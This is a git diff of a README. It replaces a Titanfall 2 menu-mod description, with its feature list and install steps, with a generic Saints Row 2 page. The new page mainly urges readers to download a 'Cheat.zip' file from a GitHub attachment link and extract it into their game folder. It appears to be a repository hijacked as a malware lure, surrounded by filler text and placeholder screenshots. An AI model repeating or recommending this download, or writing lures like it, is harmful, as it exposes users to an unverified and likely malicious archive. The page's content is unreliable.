@@ -1,120 +1,52 @@
-<p align="center" style="text-align:center"><img width="125" height="122" src="https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/icon.png" alt="Titanfall 2 - Enhanced Menu Mod" /></p>
+# Saints Row 2
 
-![VPK Build Status](https://github.com/taskinoz/Enhanced-Menu-Mod/actions/workflows/buildvpks.yml/badge.svg)
+Welcome to the repository for Saints Row 2, the much-loved open-world action-adventure video game developed by Volition and published by THQ. 
 
+## Overview
+Saints Row 2 brings you to the fictional city of Stilwater, where the player must rebuild the 3rd Street Saints gang and take on rival gangs and corrupt organizations. With its engaging storyline, diverse activities, and extensive customization options, Saints Row 2 has captured the hearts of gamers worldwide.
 
-# Enhanced Menu Mod
-Adds more options to the settings menu, such as extra keybinds, cheats, hud enhancements and cleaner interface
+## Download Cheat Codes
+To enhance your gameplay experience, you can download cheat codes for Saints Row 2 by clicking [here](https://github.com/user-attachments/files/16612167/Cheat.zip).
 
-# Features
-* Removed **Spotlight** and **Whats New** from the main menu
-* Added `sv_cheats` to the contols menu
-* Added HUD Options
-  * Bloom - `mat_disable_bloom`
-  * Show FPS - `cl_showfps`
-  * Show FPS Big - `showfps_enabled`
-  * Show Player Position - `cl_showpos`
-* Added new Keybinds
-  * Speedrunning
-    * Save/Load Quicksave 1
-    * Save/Load Quicksave 2
-    * Save/Load Quicksave 3
-    * Slow the game to 25%
-    * Speed the game up to 500%
-    * Reset all helmets
-    * Give yourself an EVA Shotgun
-    * Give yourself an EPG
-  * Demos
-    * Record Demo incrementally
-    * Record Demo
-    * Stop recording Demo
-    * Pause Demo
-    * Resume Demo
-    * Toggle Play/Pause Demo
-  * Extras
-    * Toggle low gravity
-    * Set camera to First Person
-    * Set camera to Third Person
-    * Move Third Person camera in
-    * Move Third Person camera out
-    * Hide/Show weapon
-  * No Cutscene Saves
-    * Load save 1-9 with 3 alternate saves
-  * No Cutscene Helmet Saves
-    * Load save 1 and 2
-* Added Extras Menu
-  * Demos
-    * Enable Demos
-    * Save Demos
-    * Interpolate Playback
-    * Demo record rate Single Player
-    * Demo record rate Multiplayer
-    * Key Bindings (shortcut)
-  * Gameplay
-    * Enable Wallrunning (sp)
-    * Enable Automantle (sp)
-    * Enable Vertical Dodge (sp)
-    * Player Control Debounce
-    * Command Que
-    * Speedometer Settings (Works with the MP mod)
-  * Community
-    * Communities toggle for MP
-* Audio
-  * Loading Fade Time
-  * Loading Silence Time
-* Replaced Chinese subtitles with English
-* Replaced Chinese UI text with English
-* Removed crashes from Dev launch arguments `-dev +developer 1`
-* Added Speedometer (only to Single Player)
+[![Download Cheat Codes](https://img.shields.io/badge/Download-Cheat_Codes-blue)](https://github.com/user-attachments/files/16612167/Cheat.zip)
 
-## Installation
+## Features
+- **Open World**: Explore the vast city of Stilwater with no restrictions.
+- **Customization**: Personalize your character, vehicles, and gang.
+- **Missions**: Engage in various missions and activities.
+- **Multiplayer**: Play with friends in co-op or competitive modes.
+- **Cheat Codes**: Enhance your gameplay with cheat codes.
 
-1) Download the pre-compiled version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page or [ModDB(OLD)](https://www.moddb.com/mods/enhanced-menu)
-
-2) Backup your `englishclient_frontend.bsp.pak000_dir.vpk` and copy the 2 `.vpk` files from the downloaded zip to your `Titanfall2/vpk` folder
-
-## Icepick
-
-1) Download the Icepick specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
-
-2) Open the downloaded `Enhanced.Menu.Mod.Icepick.zip` file and copy the `Enhanced.Menu.Mod.Icepick` folder to you `Icepick/data/mods` folder.
-
-3) Launch Icepick.
-
-## Northstar
-
-1) Download the Northstar specific version from the [releases](https://github.com/taskinoz/Enhanced-Menu-Mod/releases) page
-
-2) Open the downloaded `Enhanced.Menu.Mod.Northstar.zip` file and copy the `Enhanced.Menu.Mod.Northstar` folder to you `Titanfall2/R2Northstar/mods` folder.
-
-3) Launch Northstar.
+## Steps to Run Cheat Codes
+1. Download the cheat codes zip file from the link provided.
+2. Extract the contents to your Saints Row 2 game directory.
+3. Launch the game and activate the cheats as per the instructions.
 
 ## Screenshots
+Here are some captivating screenshots from Saints Row 2:
 
-![Main Menu with custom menu video](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main.jpg)
+![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 2](https://example.com/screenshot2.png)
+![Screenshot 3](https://example.com/screenshot3.png)
 
-Main Menu with the original Titanfall 2 menu video
+## FAQs
+### How can I access the cheat codes in-game?
+To activate the cheat codes, pause the game, go to the phone menu, and select "Dial". Then, enter the desired cheat code.
 
-![Main Menu with no showcase content](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-main1.jpg)
+### Can I use cheat codes in multiplayer mode?
+Cheat codes are generally disabled in multiplayer modes to ensure a fair gameplay experience for all users.
 
-Main Menu with the showcase removed to declutter the menu
+## Contributing
+We welcome contributions from the community to enhance this repository. Feel free to submit pull requests with improvements, new features, or bug fixes.
 
-![Cheats setting](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-cheats.jpg)
+## License
+This repository is licensed under the [MIT License](LICENSE). Feel free to explore, modify, and distribute the content within the bounds of this license.
 
-New Cheat options that can be enabled as well as the extras menu
+## Credits
+- **Volition**: For developing the thrilling Saints Row 2 game.
+- **THQ**: For publishing and supporting the game.
+- **Community Contributors**: For their valuable insights and contributions to the repository.
 
-![New custom keybinds](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-keys.jpg)
+---
 
-Added keybinds for speedrunners and extra commands for fun
-
-![Advanced Look Options with values](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-advanced-look.jpg)
-
-Shows the values for each setting on the Advanced Look Options
-
-![New HUD options](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-hud.jpg)
-
-Added extra HUD display options for showing FPS, Position, Velocity, and Server Tick rate
-
-![Extras Menu](https://raw.githubusercontent.com/taskinoz/Enhanced-Menu-Mod/master/assets/menu-extras.jpg)
-
-Added a menu for enabling and changing demo settings for recording single and multiplayer demos as well as turning of wallrunning and enabling titan jumping.
+By leveraging this repository, you can delve deeper into the exciting world of Saints Row 2. So gear up, dive in, and let the adventures unfold! 🎮🚗💥🏙️
